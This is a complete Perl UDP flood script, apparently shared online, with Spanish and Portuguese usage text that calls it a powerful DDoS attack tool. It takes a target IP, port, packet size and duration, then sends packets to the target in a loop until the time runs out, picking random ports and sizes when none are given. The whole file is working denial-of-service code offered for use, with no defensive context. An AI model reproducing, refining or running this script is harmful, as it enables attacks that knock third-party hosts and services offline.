#!/usr/bin/perl
 
#Created by ./ANONYMOUS
#Port - Use '80' Para Pessoas ou Porta 53 Para DNS Ou 8090 Para Site
#Size - Use '100 - 1000' (Reccomended).
 
use Socket;
use strict;
 
print '
';
print "\n";
 
 
if ($#ARGV != 3) {
print "\n\t\t\tScript Original\n";
print "\n\t\t\tAtaques muy potentes\n";
print "\n\t\t\tScript DDoS\n";
print "\n\t\t\tComo hacer un ataque\n";

  print "-Ex) perl ddoS.pl 1.1.1.1 80 1000 300\n";
  print "-Atacando la IP: '1.1.1.1' Por '300' Segundos al puerto '80' usando '1000' paquete\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}